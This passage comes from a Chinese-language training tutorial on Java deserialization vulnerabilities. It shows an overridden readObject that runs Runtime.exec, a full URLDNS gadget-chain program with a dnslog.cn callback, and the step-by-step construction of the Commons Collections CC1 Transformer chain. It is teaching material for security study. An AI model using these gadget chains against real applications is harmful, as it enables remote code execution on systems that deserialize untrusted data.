keyword\">new</span> <span class=\"token class-name\">ObjectInputStream</span><span class=\"token punctuation\">(</span>in<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Person</span> p <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Person</span><span class=\"token punctuation\">)</span> obj_in<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>把单向流出的水管换为单向流入的（<code>Output</code>换为<code>Input</code>），然后把写入数据的<code>writeObject</code>换为<code>readObject</code>，即：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>序列化数据person.txt-&gt;File类型水管-&gt;Object类型水管-&gt;Object对象\n</code></pre></div><p>（Person）这个用法是强制类型转换，将Object转Person类型，</p>\n<p>如果我们在<code>Person</code>类中重写<code>readObject</code>，那么在反序列化<code>obj_in.readObject()</code>中会自动重写自己的<code>readObject()</code>方法导致命令的执行，<strong>命令执行反序列化的最终目的其实就是重写<code>readObject()</code>方法。</strong></p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code>    <span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ObjectInputStream</span> a<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">{</span>\n        a<span class=\"token punctuation\">.</span><span class=\"token function\">defaultReadObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"calc\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n</code></pre></div><p>其中的<code>defaultReadObject</code>是为了保证反序列化正常执行的，因为如果被重写了也就意味着对象不会被解析，加上这个方法对象就可以被解析，如果不写输出时候对象的内容会为空。</p>\n<figure><figcaption>img5</figcaption></figure>\n<h4>特点/应用场景</h4>\n<ul>\n<li>常用与服务器之间的数据传输,序列化成文件,反序列化读取数据</li>\n<li>常用使用套接字流在主机之间传递对象</li>\n<li>需要序列化的文件必须实现Serializable接口,用来启用序列化功能</li>\n<li>在反序列化时,如果和序列化的版本号不一致,无法完成反序列化</li>\n</ul>\n<p>补充</p>\n<ul>\n<li>\n<p>不需要序列化的数据可以修饰成static,原因:static资源属于类资源,不随着对象被序列化输出</p>\n</li>\n<li>\n<p>不需要序列化的数据也可以被修饰成transient(临时的),只在程序运行期间在内存中存在,不会被序列化持久保存</p>\n</li>\n<li>\n<p>每一个被序列化的文件都有一个唯一的id,如果没有添加此id,编译器会自动根据类的定义信息计算产生一个</p>\n</li>\n<li>\n<p>读写顺序一致</p>\n</li>\n<li>\n<p>内部属性的类型也需要实现 Serializable 接口</p>\n</li>\n<li>\n<p>具有继承性,父类可以序列化那么子类同样可以（递归）</p>\n</li>\n</ul>\n<h3>Java反序列化漏洞利用链条分析</h3>\n<h4>URLDNS链</h4>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>hillstonenet</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token operator\">*</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Field</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">URL</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">HashMap</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">URLDNS</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">NoSuchFieldException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">IllegalAccessException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>URL<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">&gt;</span></span> hash <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>URL<span class=\"token punctuation\">,</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">URL</span> url <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">URL</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"http://esnir1.dnslog.cn\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//先反射获取URL类中的hashcode属性</span>\n        <span class=\"token class-name\">Class</span> c <span class=\"token operator\">=</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"java.net.URL\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Field</span> hashCode <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hashCode\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// java.net.URLStreamHandler类中的hashcode为protected的访问修饰符，就需要用getDeclaredField</span>\n        hashCode<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 修改访问权限为pubilc</span>\n        hashCode<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span><span class=\"token number\">123</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//修改url的hashcode不是-1，这样才会去序列化得到payload</span>\n        hash<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 得到要准备序列化的对象hash</span>\n        hashCode<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//修改回来，防止反序列化时候不往下执行</span>\n        <span class=\"token class-name\">Serialize</span><span class=\"token punctuation\">(</span>hash<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Unserialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token class-name\">Serialize</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> obj<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">ObjectOutputStream</span> out <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FileOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        out<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        out<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token class-name\">Unserialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">ObjectInputStream</span> <span class=\"token class-name\">In</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectInputStream</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FileInputStream</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Object</span> obj<span class=\"token operator\">=</span> <span class=\"token class-name\">In</span><span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>也可以查看下序列化后的1.txt</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>PS D:\\hillstone\\A&amp;DLab\\实验室培训\\攻防实验室培训_反序列化_宋晓萌\\SerializableDemo&gt; java -jar .\\SerializationDumper-v1.13.jar -r 1.txt     \n\nSTREAM_MAGIC - 0xac ed\nSTREAM_VERSION - 0x00 05\nContents\n  TC_OBJECT - 0x73\n    TC_CLASSDESC - 0x72\n      className\n        Length - 17 - 0x00 11\n        Value - java.util.HashMap - 0x6a6176612e7574696c2e486173684d6170\n      serialVersionUID - 0x05 07 da c1 c3 16 60 d1\n      newHandle 0x00 7e 00 00\n      classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE\n      fieldCount - 2 - 0x00 02\n      Fields\n        0:\n          Float - F - 0x46\n          fieldName\n            Length - 10 - 0x00 0a\n            Value - loadFactor - 0x6c6f6164466163746f72\n        1:\n          Int - I - 0x49\n          fieldName\n            Length - 9 - 0x00 09\n            Value - threshold - 0x7468726573686f6c64\n      classAnnotations\n        TC_ENDBLOCKDATA - 0x78\n      superClassDesc\n        TC_NULL - 0x70\n    newHandle 0x00 7e 00 01\n    classdata\n      java.util.HashMap\n        values\n          loadFactor\n            (float)1.06115891E9 - 0x3f 40 00 00\n          threshold\n            (int)12 - 0x00 00 00 0c\n        objectAnnotation\n          TC_BLOCKDATA - 0x77\n            Length - 8 - 0x08\n            Contents - 0x0000001000000001\n          TC_OBJECT - 0x73\n            TC_CLASSDESC - 0x72\n              className\n                Length - 12 - 0x00 0c\n                Value - java.net.URL - 0x6a6176612e6e65742e55524c\n              serialVersionUID - 0x96 25 37 36 1a fc e4 72\n              newHandle 0x00 7e 00 02\n              classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE\n              fieldCount - 7 - 0x00 07\n              Fields\n                0:\n                  Int - I - 0x49\n                  fieldName\n                    Length - 8 - 0x00 08\n                    Value - hashCode - 0x68617368436f6465\n                1:\n                  Int - I - 0x49\n                  fieldName\n                    Length - 4 - 0x00 04\n                    Value - port - 0x706f7274\n                2:\n                  Object - L - 0x4c\n                  fieldName\n                    Length - 9 - 0x00 09\n                    Value - authority - 0x617574686f72697479\n                  className1\n                    TC_STRING - 0x74\n                      newHandle 0x00 7e 00 03\n                      Length - 18 - 0x00 12\n                      Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b\n                3:\n                  Object - L - 0x4c\n                  fieldName\n                    Length - 4 - 0x00 04\n                    Value - file - 0x66696c65\n                  className1\n                    TC_REFERENCE - 0x71\n                      Handle - 8257539 - 0x00 7e 00 03\n                4:\n                  Object - L - 0x4c\n                  fieldName\n                    Length - 4 - 0x00 04\n                    Value - host - 0x686f7374\n                  className1\n                    TC_REFERENCE - 0x71\n                      Handle - 8257539 - 0x00 7e 00 03\n                5:\n                  Object - L - 0x4c\n                  fieldName\n                    Length - 8 - 0x00 08\n                    Value - protocol - 0x70726f746f636f6c\n                  className1\n                    TC_REFERENCE - 0x71\n                      Handle - 8257539 - 0x00 7e 00 03\n                6:\n                  Object - L - 0x4c\n                  fieldName\n                    Length - 3 - 0x00 03\n                    Value - ref - 0x726566\n                  className1\n                    TC_REFERENCE - 0x71\n                      Handle - 8257539 - 0x00 7e 00 03\n              classAnnotations\n                TC_ENDBLOCKDATA - 0x78\n              superClassDesc\n                TC_NULL - 0x70\n            newHandle 0x00 7e 00 04\n            classdata\n              java.net.URL\n                values\n                  hashCode\n                    (int)2133919961 - 0x7f 31 08 d9\n                  port\n                    (int)-1 - 0xff ff ff ff\n                  authority\n                    (object)\n                      TC_STRING - 0x74\n                        newHandle 0x00 7e 00 05\n                        Length - 16 - 0x00 10\n                        Value - 0ga8y4.dnslog.cn - 0x3067613879342e646e736c6f672e636e\n                  file\n                    (object)\n                      TC_STRING - 0x74\n                        newHandle 0x00 7e 00 06\n                        Length - 0 - 0x00 00\n                        Value -  - 0x\n                  host\n                    (object)\n                      TC_REFERENCE - 0x71\n                        Handle - 8257541 - 0x00 7e 00 05\n                    TC_NULL - 0x70\n            newHandle 0x00 7e 00 0a\n            classdata\n              java.lang.Number\n                values\n              java.lang.Integer\n                values\n                  value\n                    (int)1 - 0x00 00 00 01\n          TC_ENDBLOCKDATA - 0x78\n</code></pre></div><p><strong>总结URLDNS链：</strong></p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>HashMap.readObject()-&gt; HashMap.putVul-&gt;HashMap.hash()-&gt;URLStreamHandler.hashcode().getHostAddress-&gt;URLStreamHandler().hashCode().getAddressHost-&gt;getByName()\n</code></pre></div><h4>CCI链</h4>\n<p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强大的数据结构类型和实现了各种集合工具类。作为Apache开放项目的重要组件，Commons Collections被广泛的各种Java应用的开发。commons-collections组件反序列化漏洞的反射链也称为CC链，自从apache commons-collections组件爆出第一个Java反序列化漏洞后，就像打开了Java安全的新世界大门一样，之后很多Java中间件相继都爆出反序列化漏洞。</p>\n<p>CC1链有两条一条是<code>Transform</code>链另一条是<code>LazyMap</code>链。</p>\n<p>首先明确要实现的目标是：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"calc\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>因此首先要获得Runtime</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Class</span> c <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>为什么不用 Runtime.getRuntime() 换成了 Runtime.class ？</p>\n<p>前者是一个java.lang.Runtime 对象，后者是一个 java.lang.Class 对象。Class类有实现Serializable接口，所以可以被序列化。</p>\n<p>ConstantTransformer可以传一个Runtime类进去，当被遍历时调用transform方法可以返回一个Runtime类，正好作为下一个Transformer的transform方法中的参数。因此Transformer数组第一个Transformer如下：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>下一步需要调用getRuntime，它是Runtime里面的方法，前面已经传了Runtime.class，要获取该方法显然只能通过反射，而InvokerTransformer中的transform方法刚好提供了这个功能。</p>\n<p>正常反射使用方法</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Method</span> f <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getRuntime\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token class-name\">Runtime</span> r <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">)</span> f<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//获取runtime对象</span>\nr<span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"calc\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//调用exec</span>\n</code></pre></div><p>现在已经有了Runtime类，那么考虑传一个getMethod进去，然后通过反射让Runtime类调用getMethod方法，参数即为getRuntime，因此第二个Transformer如下：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">//返回Runtime类 </span>\n  \n  <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getMethod\"</span><span class=\"token punctuation\">,</span>\t\t\t<span class=\"token comment\">//反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法</span>\n    <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"getRuntime\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>然后需要调用invoke方法，因此传invoke进去，第三个Transformer如下：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> \n  \n  <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getMethod\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"getRuntime\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n  \n  <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"invoke\"</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">//调用invoke方法</span>\n    <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>最后调用exec方法，因此传exec进去，参数是命令，第四个Transformer如下：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> \n  \n  <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getMethod\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"getRuntime\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n  \n  <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"invoke\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n  \n  <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">//调用exec方法</span>\n    <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"calc\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>把Transformer[]传给ChainedTransformer</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Transformer</span> transformerChain <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span>transformers<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>TransformedMap是实现了Serializable的类，构造函数接收map，key，value。key，value都是Transformer。</p>\n<p>把transformerChain传给TransformedMap.decorate，造出一个TransformedMap对象存在tmap中</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Map</span> map <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nmap<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"value\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Roderick\"</span><span class=\"token 